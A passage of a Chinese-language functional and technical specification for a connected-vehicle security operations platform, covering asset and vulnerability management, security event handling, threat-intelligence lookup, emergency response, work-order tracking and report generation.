允许用户能够对车联网资产的每个细节进行精确管理，从而确保资产数据的完整性和最新性，加强对车联网资产的风险评估和监控能力。通过这些详细的字段，平台提供了一个强大的工具集，以支持复杂的车联网环境下的资产管理工作。</p><p>资产管理功能提供了灵活的车型添加方式，以适应不同的操作需求和场景。用户可以选择手动添加车型的方法，这种方式适用于精确控制或者小批量的资产录入。同时，平台也支持通过与其他平台的对接来导入车型信息，这对于大规模的资产管理尤为有效。这种对接导入可以通过API接口或者数据交换格式实现，极大地提高了资产录入的效率和准确性，简化了复杂的数据迁移和同步过程。这样的双重添加机制确保了资产管理的灵活性和扩展性，满足了多样化的业务需求。</p><p>资产管理功能特别强调了筛选工具的多维度性，以提升用户在处理大量车型和车辆资产时的效率。用户可以依据多种不同的维度来筛选所需的车型或车辆，包括但不限于日期、供应商、车型年代等关键参数。这种筛选机制使得用户能够灵活地从庞大的数据集中快速定位到特定的资产群体，无论是要回溯历史信息，识别特定供应商的产品，还是按照车型年代进行分析。通过这些综合筛选条件，资产管理模块提供了一个强大的查询功能，使得资产追踪和风险评估工作更加直观和高效。</p><p>在风险资产管理模块内，资产管理部分特别设计了一个直观的快捷查看功能，允许用户迅速获取车型态势和车辆态势的相关资产信息。这意味着用户可以通过几次点击，即刻访问到关于车型和车辆当前状态的详细资料，无论是运营数据、维护记录还是安全状况等。这个功能的设计目的是为了提高工作效率，确保用户能够在需要做出快速决策或进行风险评估时，立即掌握所有必要的信息。支持快捷查看的功能，确保了资产管理的便捷性，并有助于用户在面对紧急情况时，能够及时地采取行动。</p><p>在风险资产管理模块的资产管理部分，平台提供了一个专门的功能，用于支持车辆授权状态的展示。这一功能允许用户以直观的方式查看每辆车的授权状态，包括但不限于使用权限、租赁状态或其他相关的授权信息。这种展示方式使得管理人员可以轻松地监控和管理车辆的授权状况，确保所有车辆的使用都在合法和规定的权限范围内。通过这一功能，用户可以确保车辆使用的合规性，并有效地预防未授权使用的风险。</p><p>在风险资产管理模块中，资产管理功能的一大亮点是对车辆详情的深入展现，特别是在安全态势方面。该模块允许用户不仅查看车辆的基本信息，还能深入了解与车辆安全相关的各种数据，包括但不限于最近发生的安全事件、车辆车机系统的资源使用情况等。这提供了一个全面的视角，让管理者能够快速评估车辆的安全状态，确保及时响应任何潜在的安全威胁。通过这种方式，平台确保了车辆管理不仅限于日常维护，也涵盖了安全监控，为防范风险提供了一个坚实的基础。</p><h6 id="技术实现方案"><a href="#技术实现方案" class="headerlink" title="技术实现方案"></a>技术实现方案</h6><p>资产详情展示模块</p><p>资产基础信息展示：系统支持展示资产的基础信息，包括资产名称、IP地址、分组、厂商、型号、操作系统类型、物理地址、责任人等。用户可以通过资产详情页面查看和管理资产的基本信息。</p><p>资产匹配与管理模块</p><p>车型、车辆、零部件资产管理：系统支持对车型、车辆、零部件资产进行匹配和管理。用户可以将资产与相应的车型、车辆、零部件进行关联，并进行管理和跟踪。</p><p>软件资产管理：系统支持对软件资产进行管理，包括版本控制、更新记录等。用户可以查看和管理软件资产的相关信息。</p><p>车联网相关资产字段模块</p><p>车联网资产字段展示：系统支持展示车联网相关资产的字段，如硬件版本、软件版本、零部件编号、投标方信息、IP、ECUID、嵌入式操作系统版本、关联车型等。用户可以通过资产详情页面查看和管理车联网资产的详细信息。</p><p>车型管理与导入模块</p><p>车型手动添加：系统支持手动添加车型，用户可以输入车型的相关信息，并进行保存和管理。</p><p>车型导入：系统支持通过其他平台对接导入车型信息，以便快速添加和管理大量车型数据。</p><p>车型、车辆筛选与态势展示模块</p><p>车型、车辆筛选：系统支持根据日期、供应商、车型年代等维度对车型和车辆进行筛选。用户可以根据需求设置筛选条件，以便快速找到需要的车型和车辆。</p><p>车型、车辆态势展示：系统提供车型态势和车辆态势的快捷查看功能。用户可以通过相关页面查看车型和车辆的态势信息，并快速了解相关资产的情况。</p><p>车辆授权状态展示模块</p><p>车辆授权状态展示：系统支持展示车辆的授权状态，包括已授权、未授权等状态。用户可以通过车辆详情页面查看车辆的授权情况，并进行相应的管理和操作。</p><p>车辆安全态势展示模块</p><p>车辆安全态势展示：系统支持查看车辆的安全态势，包括事件、车机资源等。用户可以通过车辆详情页面查看车辆的安全情况，并了解相关事件和车机资源的信息。</p><h5 id="漏洞管理-1"><a href="#漏洞管理-1" class="headerlink" title="漏洞管理"></a>漏洞管理</h5><p>漏洞管理：实时监测车联网平台中的漏洞情况，包括已知漏洞和新发现漏洞。</p><h6 id="功能实施方案-47"><a href="#功能实施方案-47" class="headerlink" title="功能实施方案"></a>功能实施方案</h6><ol><li>在风险资产管理模块中，漏洞管理部分的设计必须包含一套细致的权限管控机制。这个机制的主要职责是确保所有关于漏洞管理的操作，例如识别、评估、处理和报告漏洞等，都受到严格的权限限制。这意味着每一个操作都需要相应的授权，确保只有具备相应权限的用户才能执行。这样的措施对于维护系统的安全性至关重要，因为它可以有效地防止未授权的访问和潜在的安全风险。通过这种方式，平台能够保障漏洞管理的各个环节都在严格的监控之下，从而确保风险资产得到妥善的管理和保护。</li><li>在风险资产管理模块的漏洞管理部分，一个关键的功能是支持与外部的漏洞管理平台进行对接。这个对接功能使得平台能够实时同步漏洞信息，确保在漏洞识别和响应过程中信息的时效性和准确性。通过这种集成，用户可以无缝地更新和共享漏洞数据，从而提高了漏洞处理的效率。这一功能对于那些需要在多个系统或平台之间协调漏洞管理工作的组织来说尤其重要，因为它可以确保所有相关的漏洞信息都是最新的，帮助安全团队更有效地防范和修复潜在的安全威胁。</li><li>风险资产管理模块的漏洞管理部分必须具备灵活的查看功能，以便用户能从不同的维度审视和分析主题漏洞库。这意味着平台应当提供多角度的视图选项，如按照时间、严重性、影响范围或漏洞类型等分类，来组织和显示漏洞数据。通过这种支持，用户可以更加有效地识别关键漏洞，优先处理那些最为紧急或影响最广的安全问题。这样的功能强化了漏洞管理的策略性和针对性，帮助用户制定更加精准的安全防护措施。</li><li>在风险资产管理模块中，漏洞管理部分应具备一项高效的自动化处理功能，即针对检测到的高危漏洞，系统能够自动产生工单。这样的自动化流程大大加快了响应时间，确保了关键漏洞能够得到快速且适当的关注。一旦工单生成，平台还应能够立即通知到指定的负责人或团队，这样可以保证相关人员能够及时采取措施，如进行修补或实施其他必要的安全控制。这种自动通知机制是确保信息安全的关键环节，它帮助组织在漏洞可能被利用之前，迅速采取行动。</li><li>在风险资产管理模块中，漏洞管理模块需具备强大的管理与分析能力，能够支持基于漏洞的多视角管理和分析功能。这意味着平台应当能够提供包括但不限于零部件供应商名称、漏洞数量、漏洞名称、漏洞级别、关联零部件、相关车型等多个维度的数据展示和分析工具。这样的设计允许用户从各种角度深入理解漏洞情况，帮助他们在评估风险和制定修复策略时，能够考虑到各方面的信息，确保了处理过程的全面性和准确性。通过这种多维度的分析，用户可以更有效地识别和优先处理对系统安全性影响最大的漏洞。</li></ol><h6 id="技术实现内容-40"><a href="#技术实现内容-40" class="headerlink" title="技术实现内容"></a>技术实现内容</h6><p>权限管控机制</p><p>操作权限控制：支持对系统的相关操作进行权限管控，确保只有具有相应权限的用户才能执行敏感操作，例如记录事件、查询漏洞信息等。</p><p>漏洞管理平台对接模块</p><p>平台对接功能：支持与漏洞管理平台进行对接，实现漏洞信息的同步。可以通过API或其他方式与漏洞管理平台进行数据交互，确保漏洞信息的及时更新和同步。</p><p>主题漏洞库查看模块</p><p>多维度查看：支持根据不同维度查看主题漏洞库。用户可以按照零部件供应商名称、漏洞数量、漏洞名称、漏洞级别、关联零部件、相关车型等多个维度进行查看和筛选。</p><p>高危漏洞工单生成与通知模块</p><p>自动工单生成：针对高危漏洞，系统支持自动生成工单。当检测到高危漏洞时，系统可以自动创建相应的工单，并将工单通知到相应的负责人。</p><p>漏洞的多视角管理和分析模块</p><p>多维度管理和分析：支持基于漏洞的多视角管理和分析。用户可以从零部件供应商名称、漏洞数量、漏洞名称、漏洞级别、关联零部件、相关车型等多个维度对漏洞进行管理和分析。</p><h4 id="事件处置"><a href="#事件处置" class="headerlink" title="事件处置"></a>事件处置</h4><h5 id="事件管理"><a href="#事件管理" class="headerlink" title="事件管理"></a>事件管理</h5><p>事件管理：实时监测车联网平台的安全事件，包括入侵事件、异常行为等。</p><h6 id="功能实施方案-48"><a href="#功能实施方案-48" class="headerlink" title="功能实施方案"></a>功能实施方案</h6><p>在事件处置模块中，事件管理模块提供了一个重要功能，即对车辆事件的详细记录。这个功能使得用户能够记录包括事件发生的具体时间、涉及的车型、具体车辆、所用设备类型、遭受的攻击类型以及事件的严重等级等关键信息。这样的详细记录不仅便于安全团队追踪和分析事件，而且对于后续的审计、合规性报告和改进安全措施至关重要。通过这些记录，团队可以快速响应事件，并根据事件的严重性采取相应的处置措施，从而提高车辆和乘客的安全。</p><p>事件处置模块内嵌的事件管理模块具备强大的事件查询功能，用户可以根据多种条件进行搜索，包括时间、车型、车辆、攻击类型和设备类型等。这种灵活的查询能力使得用户能够迅速定位到特定事件，从而对事件进行深入分析和快速响应。通过这种方式，安全团队可以有效地缩小搜索范围，提高处置效率，确保及时发现和解决潜在的安全威胁。</p><p>在事件管理模块中，提供了一项关键功能，即对事件风险等级的准确判断。该模块允许用户通过在线打分机制来评估事件的严重性，进而计算出一个具体的事件风险等级结果。这一过程不仅有助于立即识别高风险事件，还为安全响应团队提供了一个量化的风险评估，使他们能够按优先级顺序处理事件，并分配相应的资源以最有效地减轻或消除安全威胁。</p><p>在事件管理模块中，提供了攻击者画像的强大支持功能，它允许用户从多个维度，如攻击次数、攻击的等级、攻击时间、攻击组件、攻击接口等，深入了解攻击者的行为模式。通过这些详细的数据分析，用户可以以图表的形式直观地展示一段时间内的攻击数和攻击总数。此外，模块还提供了灵活的统计周期选项，可以按照日、周、月来展示数据，从而帮助安全团队识别攻击趋势，优化安全策略，并有效防御未来可能的安全威胁。</p><p>事件管理模块的一个关键特性是提供了被害者画像功能，这使得用户能够对受害IP的攻击信息进行全面的统计和查看。通过这个功能，用户可以利用直观的可视化工具来展示攻击手段的统计数据，以及攻击发生的时间分布情况。此外，该模块还支持显示一个详细的攻击列表数据，这样用户不仅能够识别攻击的模式和趋势，还能够获得每一次具体攻击事件的详尽信息，帮助用户更全面的理解攻击事件，并采取相应的应对手段。</p><p>在事件管理模块的设计中，注重数据的持久性和一致性。因此，所有的安全事件数据都会被保存到后端数据库中，实现了对事件数据的统一存储。这种做法不仅确保了数据的安全性和完整性，而且便于进行统一的访问管理。无论是进行数据分析、生成报告还是回溯调查，安全团队都可以依赖这个可靠的数据存储方案，高效地从数据库中检索所需的事件信息。</p><h6 id="技术实现内容-41"><a href="#技术实现内容-41" class="headerlink" title="技术实现内容"></a>技术实现内容</h6><p>车辆事件记录模块</p><p>事件记录功能：支持对车辆事件进行记录，包括事件时间、车型、车辆、设备类型、攻击类型、等级等信息。将事件信息保存到数据库中，以便后续查询和分析。</p><p>事件查询功能模块</p><p>多维度查询：支持根据时间、车型、车辆、攻击类型、设备类型等方式对事件进行查询。用户可以根据自己的需求，灵活地筛选和检索特定的事件。</p><p>事件风险等级判断模块</p><p>在线打分：支持对事件的风险等级进行判断和评估。系统可以根据预设的规则和算法，对事件进行在线打分，并计算出事件的风险等级结果。</p><p>攻击者画像展示模块</p><p>多维度画像展示：支持根据攻击者的攻击次数、攻击等级、攻击时间、攻击组件、攻击接口等不同维度，以图表的形式展示一段时间内的攻击数和攻击总数。统计周期可按日、周、月进行展示。</p><p>被害者画像展示模块</p><p>攻击信息统计展示：支持查看受害IP的攻击信息统计，以可视化的方式展示攻击手段的统计和攻击时间分布。同时，支持展示攻击的详细列表数据，让用户能够深入了解攻击的细节和特征。</p><p>数据库存储与管理</p><p>统一存储与访问管理：所有事件均保存到数据库中，实现统一的存储和访问管理。这样可以确保数据的安全性和一致性，并方便后续的数据分析和查询操作。</p><p>安全事件检测模块</p><p>实时监测：系统对车联网系统进行实时监测，检测各种安全事件，包括入侵尝试、异常行为、恶意软件活动等。系统可以使用各种检测技术，如行为分析、异常检测、规则引擎等，以确保及时发现安全事件。</p><p>通报机制</p><p>多渠道通知：系统可以通过多种渠道进行通知，包括电子邮件、短信、即时消息等。用户可以根据需要选择接收通知的方式，并设置通知优先级和接收人员。</p><p>预设通报规则：系统支持预设通报规则，用户可以根据事件的严重程度和紧急程度设置通报规则。例如，对于高危事件可以设置立即通报相关人员，而对于低危事件可以设置延迟通报或者仅通报给特定人员。</p><p>事件通报管理模块</p><p>通报记录管理：系统记录安全事件的通报历史，包括通报时间、通报内容、通报对象等信息。用户可以查看通报记录，了解事件的通报情况和处理进展。</p><p>通报反馈机制：系统支持通报的反馈机制，相关人员可以对通报事件进行反馈，提供处理进展、处理结果等信息。这样可以确保通报的及时性和有效性。</p><h5 id="威胁预警"><a href="#威胁预警" class="headerlink" title="威胁预警"></a>威胁预警</h5><p>威胁预警：根据威胁分析和风险评估结果，提供针对性的预警通知。</p><h6 id="功能实施方案-49"><a href="#功能实施方案-49" class="headerlink" title="功能实施方案"></a>功能实施方案</h6><ol><li>支持对本地威胁情报的检索，包括IP主机信息、IP位置信息、域名流行度、情报IOC详情、相关样本以及可视化分析等。通过这些功能，平台能够快速定位威胁源，深入了解威胁详情，为后续处置提供有力支持。相关功能的界面截图如下：</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/e953635a9fcd10e50156aca86a7e9d23.png"></p><ol><li>具备与云端威胁情报服务的对接能力，能够获取更广泛的情报数据，提供更全面的查询结果。查询结果包含IP主机信息、IP位置信息、域名流行度、情报IOC详情、相关样本、可视化分析、域名解析记录、域名注册信息、关联域名以及数字证书等信息。这些信息能够帮助组织全面了解威胁情况，提高安全防范能力。相关功能的界面截图如下：</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/4991037458bce8d2e7c88e28e3a95d56.png"></p><ol><li>支持自定义威胁情报，支持类型包含IP地址、域名、MD5、域名:URI、IP地址:URI、域名:端口、IP地址:端口、域名:端口:URI、IP地址:端口:URI。支持自定义IPv6的威胁情报，相关功能的界面截图如下：</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/74cc82bac110861009053723b77e5e3c.png"></p><ol><li>在事件处置模块中，威胁预警功能提供了强大的自定义能力，使得用户能够根据自身的安全需求建立专属的风险模型。用户可以通过这一功能针对特定的风险元素，例如风险零部件、风险车辆以及风险车型等，进行细致的预警设置。这允许安全团队根据历史数据和行业标准，定义出一套预警规则，一旦系统检测到符合这些规则的风险特征，就会立即发出预警，从而帮助相关人员提前识别潜在威胁，采取预定的防范措施，以防风险发展成更严重的安全事件。</li><li>事件处置模块的威胁预警系统不仅提供了风险模型的自定义构建，而且还确保了这些风险模型规则能够得到运维团队的全面支持。这意味着运维人员可以根据实际运营中遇到的安全威胁和风险情况，动态调整和优化风险模型规则。通过这种方式，威胁预警机制能够更灵活地适应不断变化的网络环境和安全需求，从而提高对潜在威胁的响应速度和准确性。</li></ol><h6 id="技术实现内容-42"><a href="#技术实现内容-42" class="headerlink" title="技术实现内容"></a>技术实现内容</h6><p>威胁管理</p><p>本地威胁检索：支持对本地威胁情报的检索功能，检索结果包含但不限于以下内容：IP主机信息、IP位置信息、域名流行度、情报IOC详情、相关样本、可视化分析、域名解析记录、域名注册信息、关联域名、数字证书等信息。界面截图如下：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/e953635a9fcd10e50156aca86a7e9d23.png"></p><p>云端威胁检索：支持对云端威胁情报的检索功能，检索结果包含但不限于以下内容：IP主机信息、IP位置信息、域名流行度、情报IOC详情、相关样本、可视化分析、域名解析记录、域名注册信息、关联域名、数字证书等信息。界面截图如下：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/4991037458bce8d2e7c88e28e3a95d56.png"></p><p>支持自定义新建威胁情报：支持类型包含IP地址、域名、MD5、域名:URI、IP地址:URI、域名:端口、IP地址:端口、域名:端口:URI、IP地址:端口:URI。界面截图如下：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/74cc82bac110861009053723b77e5e3c.png"></p><p>威胁分析和风险评估模块</p><p>威胁分析：系统基于收集到的威胁情报数据和实时监测数据，进行威胁分析，识别和评估车联网系统面临的潜在威胁。通过分析威胁的类型、来源、攻击手段等关键信息，系统可以准确评估威胁的严重程度和影响范围。</p><p>风险评估：系统根据威胁分析的结果，结合车联网系统的安全配置和漏洞情况，进行风险评估。系统可以对不同威胁和漏洞进行权重和优先级的评估，以确定最具风险的问题和潜在影响。</p><p>预警通知机制</p><p>定制化预警规则：系统支持定制化的预警规则，用户可以根据自身需求和风险评估结果，设置预警规则。例如，用户可以设置当某个特定威胁或漏洞在零部件、车辆、车型达到一定的严重程度或数量时，系统会触发预警通知。</p><p>多种通知方式：系统可以通过多种通知方式进行预警通知，包括电子邮件、短信、即时消息等。用户可以根据需要选择接收通知的方式，并设置通知优先级和接收人员。</p><p>预警通知管理模块</p><p>通知记录管理：系统记录预警通知的历史，包括通知时间、通知内容、通知对象等信息。用户可以查看通知记录，了解预警的触发情况和处理进展。</p><p>预警响应和处理：系统支持预警的响应和处理功能，相关人员可以根据预警通知及时采取相应的安全措施，以减轻潜在威胁的影响。</p><h5 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h5><p>应急响应：对发生的安全事件进行快速响应和处置，包括调度安全服务单位、技术支撑厂商、专家组等。</p><h6 id="功能实施方案-50"><a href="#功能实施方案-50" class="headerlink" title="功能实施方案"></a>功能实施方案</h6><ol><li>事件处置模块的应急响应功能允许用户根据自己的网络安全需求配置专属的应急响应流程。这一功能的设计目的是为了确保在面对网络安全事件时，能够迅速且有序地进行处置。用户可以通过该模块设定一系列流程和步骤，包括初步诊断、事件分类、响应措施选择、事后分析等，从而构建出一套完整的应急响应机制。这样的配置能够帮助企业在遭受网络攻击或其他安全事件时，快速启动应急预案，减少潜在的损失。</li><li>事件处置模块中的应急响应特性强调了权限管理和告警追溯的重要性。在这个系统中，具有相关权限的人员将被授权访问和审查所有的告警通知记录。这一机制确保了在发生安全事件时，授权人员可以及时地回溯和分析告警历史，以便准确地识别安全事件的来源、影响范围及潜在的攻击模式。通过这种方式，不仅提高了安全事件处理的透明度，也为未来的预防措施和安全策略的制定提供了重要的数据支持。</li><li>在事件处置模块的应急响应功能中，对告警通知的要求是明确且易于理解的。这意味着系统不仅需要清晰地展示每一个告警的内容和状态，而且还必须允许有权限的人员对这些告警状态进行维护。维护操作可能包括确认告警、分类处理、更新进度或关闭告警等。这样的设计可以确保告警信息的准确性和时效性，让应对团队能够及时地跟踪和处理每一条告警，从而有效地降低安全事件对组织造成的影响。</li><li>事件处置模块的应急响应机制强调了告警通知的多样化传递方式，确保关键信息能够及时准确地传达给相应的负责人。为了实现这一点，系统提供了包括系统内消息、电子邮件等多种告警通知方式。这种灵活的通知策略允许组织根据不同负责人的工作习惯和可用性定制最合适的告警传递方法，从而确保无论何时何地，负责人都能够接收到告警，及时响应潜在的安全事件。这种通知机制的多样性和灵活性是确保快速有效应急响应的关键要素。</li></ol><h6 id="技术实现内容-43"><a href="#技术实现内容-43" class="headerlink" title="技术实现内容"></a>技术实现内容</h6><p>网络安全应急响应流程配置模块</p><p>流程定义：系统支持配置网络安全应急响应的流程，包括事件识别、事件确认、应急响应、恢复与修复等环节。用户可以根据实际需求定义和定制应急响应流程，确保在安全事件发生时能够迅速、有序地进行响应。</p><p>权限管理：系统支持对应急响应流程进行权限管理，确保只有具有相关权限的人员才能进行配置和修改。这样可以保证应急响应流程的安全性和可靠性。</p><p>告警通知追溯模块</p><p>告警追溯功能：系统记录所有的告警通知，包括通知时间、通知内容、通知对象等信息。具有相关权限的人员可以通过系统进行告警通知的追溯，了解告警的触发情况和处理进展。这有助于进行事件溯源和后续分析。</p><p>审计日志：系统还提供审计日志功能，记录对告警通知的操作记录，包括查看、修改、删除等操作。这样可以确保告警通知的操作过程可追溯和可审计。</p><p>告警通知状态维护模块</p><p>状态管理：系统支持告警通知的状态维护，包括告警状态的定义和维护。用户可以根据实际需求设置告警状态，如待处理、处理中、已解决等。这样有助于对告警通知的管理和跟踪。</p><p>告警通知方式配置模块</p><p>通知方式定义：系统支持配置告警通知的方式，包括系统消息、邮件等方式。用户可以根据需要选择合适的通知方式，并设置通知优先级和接收人员。</p><p>通知到负责人：系统确保告警通知能够准确通知到相应的负责人，根据配置的通知方式和接收人员信息，将告警通知发送给指定的负责人。</p><h5 id="工单管理-1"><a href="#工单管理-1" class="headerlink" title="工单管理"></a>工单管理</h5><p>工单管理：统一操作和管理所有系统工单。</p><h6 id="功能实施方案-51"><a href="#功能实施方案-51" class="headerlink" title="功能实施方案"></a>功能实施方案</h6><ol><li>事件处置模块中的工单管理系统设计得非常灵活，允许用户单独创建工单，并且可以直接指派给团队中的其他成员。这个功能的设计初衷是为了确保当发现问题或任务时，任何授权用户都能够迅速地反应，通过建立一个新的工单来详细记录事件的相关信息，并将其分配给最适合处理该问题的团队成员。这样的流程不仅提高了问题解决的效率，也保证了工作的连续性和责任的明确性。通过这种方式，管理层能够确保每一项任务都能被追踪和监督，直至最终解决。</li><li>在事件处置模块的工单管理系统中，为了提高处理效率和透明度，特别强调了工单状态的可追溯性。用户可以实时监控工单的状态，包括但不限于待下发、待处置、处置中、已处置、已完成、已撤销等多个阶段。这种细分的状态设计让管理者和相关人员能够清晰地了解每个工单的进展情况，并且在必要时进行事件催办。此外，系统支持工单流转和多人协同处理的方式，这意味着工单可以在不同的责任人之间流转，实现团队协作，从而提升了处理工单的效率和质量。这种工单跟踪处理机制不仅提高了工作效率，也加强了团队成员之间的协同合作。</li><li>在平台的事件处置模块内，工单管理的灵活性是一个重要的特点。用户拥有权限可以对工单执行多种操作，包括进行编辑来更新工单内容、修改以纠正任何错误或变更需求、查看以获取工单详情以及监控进展情况，还可以在必要时删除工单。这些功能确保了工单信息随时保持最新，同时也方便了管理人员对事件处置流程的全面控制。通过这些操作，团队能够保持高效的工作流程，确保信息的准确性和处理的及时性。</li><li>平台在工单处理的过程中，非常注重对风险事件的等级划分，以确保优先处理最紧急的问题。每个工单都会明确显示其风险事件等级、具体类型和当前的状态，同时指定一个负责处理的人员。这样的设计有助于工单的快速分派和处理，确保事件按照严重性和紧迫性得到妥善管理。</li><li>为了提升工单管理的效率，系统提供了高度灵活的筛选功能。用户可以依据工单号、风险事件的等级、类型以及状态来筛选工单。这一功能使得用户能够迅速定位到特定的工单，从而更加高效地进行事件处理和资源分配。</li><li>平台提供了一个全面的功能，允许用户查看所有响应的工单信息。为了方便用户快速找到所需的工单，系统支持按照车型、车辆以及工单生成时间等多个维度进行过滤搜索。这种灵活的搜索机制大幅度提高了用户在处理大量数据时的查找效率，使得管理和跟踪工单变得更加简单和直观。</li><li>在事件处置模块中，工单访问控制是根据用户的身份和角色来实现的。这意味着不同的用户会根据其职责和权限获得对工单的访问权。这种访问控制确保了信息的安全性和合规性，同时允许团队成员根据其角色和工作需求来处理相关的工单。</li><li>平台支持用户对工单进行快速响应。用户不仅可以执行响应操作，还可以在系统中录入工单的处理方式和说明，随后填报处理结果。这种功能的设计旨在记录处理过程中的关键信息，并确保最终结果的透明度和可追溯性。</li><li>当系统检测到潜在的安全问题时，会自动触发预警机制。对于这些预警结果，平台能够自动生成工单，并将其自动派发给相应的安全运维人员。这种自动化流程加快了响应时间，确保了安全事件能够得到及时和有效的处理。</li><li>平台提供了一个专门的“我的工单”查看功能，允许用户轻松追踪和管理自己的工单。工单状态的分类非常细致，包括待下发、待处置、处置中、已处置、已完成、已撤销等多个阶段。此外，平台支持工单流转和多人协同处理，确保在工单的每个阶段都能有序地进行，同时允许团队成员之间的有效沟通和协作，以实现高效的工单跟踪处理。</li><li>在应对紧急事件时，资源的管理至关重要。因此，系统支持对应急响应资源进行综合管理，这包括了应急团队接口人、专家库成员、负责人等的联系方式。通过这种方式，用户可以迅速联系到关键人员，确保在紧急情况下能够得到快速而有效的响应。</li><li>为了确保及时有效的沟通，平台已经与多种即时通信系统对接。用户可以选择通过邮件、短信、企业钉钉等多个渠道来通知指定的责任人。这种灵活的通知方式有助于确保关键信息能够及时传达给相关责任人，从而加快问题的响应和处理速度。</li></ol><h6 id="技术实现内容-44"><a href="#技术实现内容-44" class="headerlink" title="技术实现内容"></a>技术实现内容</h6><p>工单管理模块</p><p>发起工单并指派给其他成员：系统支持用户单独发起工单，并将工单指派给其他成员进行处理。用户可以填写工单相关信息，并选择适当的处理人员。</p><p>工单状态追溯与催办：系统记录工单的状态变化，并提供工单状态追溯功能。用户可以催办工单，以加快工单的处理进度。工单状态包括待下发、待处置、处置中、已处置、已完成、已撤销等。</p><p>工单流转与协同处理：系统支持工单的流转和多人协同处理方式。工单可以在不同处理人员之间流转，以便实现多人协同处理工单的需求。</p><p>编辑、修改、查看、删除工单：用户可以对工单进行编辑、修改、查看和删除操作，以满足工单管理的灵活性。</p><p>风险事件等级、类型、状态、处理人：工单处理过程中体现风险事件的等级、类型、状态和处理人等相关信息，以便进行工单的分类和跟踪。</p><p>工单筛选与搜索模块</p><p>工单筛选与搜索：系统支持根据工单号、风险事件等级、类型、状态等条件进行工单的筛选和搜索，以便用户快速找到所需的工单。</p><p>响应工单信息查看与过滤搜索：用户可以查看所有的响应工单信息，并根据车型、车辆、工单生成时间等进行过滤和搜索。</p><p>工单访问控制模块</p><p>工单访问控制：系统根据不同用户和角色实现工单的访问控制，确保只有授权用户可以访问和操作工单相关功能。</p><p>工单响应与处理模块</p><p>工单响应操作：用户可以对工单进行响应操作，包括接受工单、拒绝工单等。用户可以录入工单处理方式说明和填报结果。</p><p>应急响应资源管理模块</p><p>应急响应资源管理：系统支持管理应急团队接口人、专家库成员、负责人等联系方式，以便在工单处理过程中获取必要的联系信息。</p><p>通知与对接模块</p><p>通知与对接：系统支持与及时通信系统对接，如通过邮件、短信、企业微信、消息中心、企业钉钉、蓝信等方式通知指定责任人。同时，系统还支持与后工单系统或相应的流程系统进行对接，以实现工单数据的共享和流转。</p><p>专案专报</p><p>专案专报：生成专案和专报，记录应急处置过程和结果。</p><p>专案管理模块</p><p>专案创建：系统支持创建专案，用户可以为每个应急事件创建专案，并记录相关信息，如事件名称、发生时间、事件描述等。</p><p>专案分配：系统支持将专案分配给相应的责任人员或团队，确保应急处置工作有组织地进行。</p><p>专案进展跟踪：系统记录专案的进展情况，包括任务完成情况、时间节点等，以便监控和评估应急处置工作的进展。</p><p>专案生成模块</p><p>专报模板：系统提供专报模板，用户可以选择合适的模板用于生成专报。模板包括标题、摘要、事件描述、处置过程、结果总结等内容。</p><p>专报填写：用户根据实际应急处置情况，填写专报的各个部分内容。系统提供编辑工具和格式化选项，以便用户编写规范、清晰的专报。</p><p>专报生成：系统根据填写的内容，自动生成专报文档，包括格式、排版、页眉页脚等，以确保专报的专业性和统一性。</p><p>专报存档和检索模块：</p><p>专报存档：系统将生成的专报进行存档，以便后续查阅和检索。存档包括专报的版本、生成时间、相关专案信息等。</p><p>专报检索：用户可以通过关键词、时间范围等条件进行专报的检索，以快速找到需要的专报文档。</p><h4 id="日志统计"><a href="#日志统计" class="headerlink" title="日志统计"></a>日志统计</h4><h5 id="功能实施方案-52"><a href="#功能实施方案-52" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><ol><li>在平台中，统计报表模块被设计有严格的权限划分，确保只有授权用户才能访问和操作报表。这种权限管理机制有助于保护数据安全，同时确保用户只能看到他们被授权查看的信息，以此来维护报表数据的机密性和完整性。</li><li>为了满足不同周期的数据分析需求，平台提供了一系列默认报表，包括日报、周报、月报、季报及年报。这些报表涵盖了车辆、事件、工单等关键业务数据，帮助用户快速把握业务运行的各个方面。</li><li>系统支持生成日报、周报、月报、季报和年报，并且用户可以利用预设的报表模板来简化报表创建过程。此外，报表中还可以展示水印，增加报表的正式性和安全性。用户还能够自定义报表的时间范围，并且支持将报表下载为PDF、Word、HTML三种格式。为了加强沟通效率，系统还支持通过邮件、短信、企业微信、消息中心、企业钉钉、蓝信等方式通知指定责任人。</li><li>系统提供了多种数据展示形式的选择，比如柱状图、折线图、饼图等。这样的设计使得数据分析更加直观、易于理解，帮助用户从不同角度分析数据，从而做出更加精准的业务决策。</li><li>为了适应用户对报表内容的个性化需求，平台支持扩展字段内容的添加，例如车型、零部件等。这种灵活性允许用户根据自身业务的特点，定制更为详细和具体的报表，以便更好地分析和管理业务数据。</li><li>为了方便用户将报表数据进行存档或分享，报表支持导出功能，用户可以将报表导出为PDF、Excel、Word等格式。这样的设计不仅提高了报表的可用性，也方便了数据的进一步处理和分析。</li></ol><h5 id="技术实现内容-45"><a href="#技术实现内容-45" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><h6 id="统计报表管理"><a href="#统计报表管理" class="headerlink" 